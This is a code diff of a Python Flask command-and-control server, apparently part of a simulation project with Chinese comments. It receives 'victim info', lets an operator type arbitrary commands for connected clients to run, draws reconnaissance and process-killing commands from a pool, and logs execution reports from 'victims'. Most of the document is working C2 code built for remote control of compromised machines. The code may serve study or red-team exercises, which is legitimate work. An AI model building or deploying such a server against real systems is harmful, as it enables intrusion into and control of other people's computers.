@@ -90,45 +90,38 @@ def receive_data():
     except Exception as e:
         print(f"Error: {str(e)}")
         return jsonify({"status": "Error processing data"}), 500
-
-# expected_guid = "43 EB 8C BD 1D 98 3D 14" 
-expected_guid = "d2f2c6aa-4be9-44b1-991c-1d020d90e16f"  
+    
 @app.route('/send_info', methods=['POST'])
 def send_info():
     try:
         # 接收 victim info
         info = request.json
         print("Victim Info:", info)
-        # print(info.get('machine_guid'))
-        if info.get('machine_guid') == expected_guid:
-            return jsonify({"status": "C2 server obtained victim info, and victim guid matches.", "message": "success"}), 200
-        else:
-            return jsonify({"status": "C2 server obtained victim info, but victim guid does not match.", "message": "fail"}), 200
+        return jsonify({"status": "C2 server obtained victim info.", "message": "success"}), 200
+
     except Exception as e:
         print(f"Error: {str(e)}")
         return jsonify({"status": "Error getting info"}), 500
 
+@app.route('/send_pending_command', methods=['GET'])
+def send_pending_command():
+    global pending_command
+    pending_command = None
+    command = input("Please input the command to send to the client: ")
+    if command:
+        pending_command = command
+    else:
+        print("No command provided.")
+    
+    if pending_command:      
+        return jsonify({"status": "success", "command": pending_command, "message": "Command sent to connected clients."})
+    else:
+        return jsonify({"status": "error", "message": "No pending command to send."})
 
-
-# 模擬 命令參數
+# 模擬 100 個命令參數
 COMMAND_POOL = [
-    "whoami",
-    "ipconfig",
-    "ipconfig /all",
-    "ping www.google.com",  
-    "Get-ComputerInfo", # get info
-    "nslookup", 
-    "ls",
-    "netstat -an",
-    "systeminfo",
-    "get-process -name 'signBT' ",
-    "get-process", 
-    "Stop-Process -Name 'CalculatorApp' ",
-    "gdr -PSProvider 'FileSystem' ", # getDriveList
-    "arp -a",
-    # "invoke-webrequest -uri "" -outfile "" ",
-    # "kill -9 `jobs -ps`", #processkill
-
+    "whoami", "ipconfig", "ping www.google.com",  
+    "Get-ComputerInfo", "nslookup", "ls"
     # Add more commands as needed
 ]
 
@@ -165,34 +158,11 @@ def encrypt_data(data):
     # 將 IV 和密文一併 base64 編碼後返回
     return base64.b64encode(cipher.iv + ciphertext).decode('utf-8')
 
-@app.route('/send_pending_command', methods=['POST'])
-def send_pending_command():
-    global pending_command
-    pending_command = None
-    command = input("Please input the command to send to the client: ")
-    try:
-        pending_command = command
-        # 使用 AES 加密命令
-        encrypted_command = encrypt_data(pending_command)
-        print(f"Encrypted Command: {encrypted_command}")
-        return jsonify({"status": "success", "command": pending_command, "type": "powershell"}), 200
-    except Exception as e:
-        print("No command provided.")
-        print(f"Error: {str(e)}")
-        return jsonify({"status": "error", "message": str(e)}), 500
-    
-    # if pending_command:      
-    #     return jsonify({"status": "success", "command": pending_command, "message": "Command sent to connected clients."})
-    # else:
-    #     return jsonify({"status": "error", "message": "No pending command to send."})
-
 @app.route('/get_command', methods=['POST'])
 def get_command():
     try:
         # 隨機從命令池中選擇一個命令
-        selected_command = random.choice(COMMAND_POOL) # 改成可以讓server去input
-        # selected_command = send_pending_command()
-
+        selected_command = random.choice(COMMAND_POOL)
         # selected_command_as_bytes = str.encode(selected_command)
         selected_command_as_bytes = selected_command
         print(f"Selected Command: {selected_command_as_bytes}")
@@ -212,9 +182,7 @@ def report_success():
     try:
         data = request.json
         if data.get('status') == 'OK':
-            print(f"Prefix: {data.get('prefix')}")
             print("Command executed successfully on victim.")
-            print("Output:", data.get('output'))
         return jsonify({"status": "C2 server received success"}), 200
 
     except Exception as e:
@@ -225,7 +193,6 @@ def report_success():
 def report_failure():
     try:
         data = request.json
-        print(f"Prefix: {data.get('prefix')}")
         print(f"Command execution failed on victim: {data.get('reason')}")
         return jsonify({"status": "C2 server received failure"}), 200
 
